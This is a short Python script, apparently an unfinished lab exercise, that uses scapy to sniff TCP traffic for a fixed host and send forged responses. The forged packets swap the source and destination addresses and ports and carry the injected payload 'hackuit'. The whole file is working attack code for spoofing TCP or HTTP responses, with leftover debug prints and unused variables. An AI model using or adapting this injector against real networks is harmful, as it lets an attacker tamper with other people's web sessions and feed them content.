import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # remove scapy warnings

from scapy.all import *
conf.verb = 0 # turn off scapy messages

import sys

html = 'good'
default_value = 10

def start_injecting():
    print('Listening for http GET requests...')
    
    sniff(prn=inject,
          filter='tcp and  host 198.7.0.2'
    ) 

def inject(p): # got packet, inject my html
    response = forge_response(p)
    payload_before = len(p[TCP].payload)
    #print(type(p[TCP].payload))
    print(p)
    print(type(p))
    #print(p[TCP].payload)
    #p[TCP].payload = p[TCP].payload + 'hackuit'.encode()
    payload_after = len(p[TCP].payload)
    payload_dif = payload_after - payload_before
    p[IP].len = p[IP].len + payload_dif
    print('Spoofed Response: ' + str(p[IP].src) + '->' + str(p[IP].dst))
    del p[TCP].chksum
    del p[IP].chksum
    sendp(response) # send spoofed response
            
def forge_response(p):
    ether = Ether(src=p[Ether].dst, dst=p[Ether].src) # switch ethernet direction
    ip = IP(src=p[IP].dst, dst=p[IP].src) # switch direction of ip address
    tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq, flags="PA") # switch direction of ports and send FIN
    
    # create http response
    response = 'hackuit'.encode('utf-8')
    
    my_packet = ether / ip / tcp / response # forge response packet with my html in it
    return my_packet
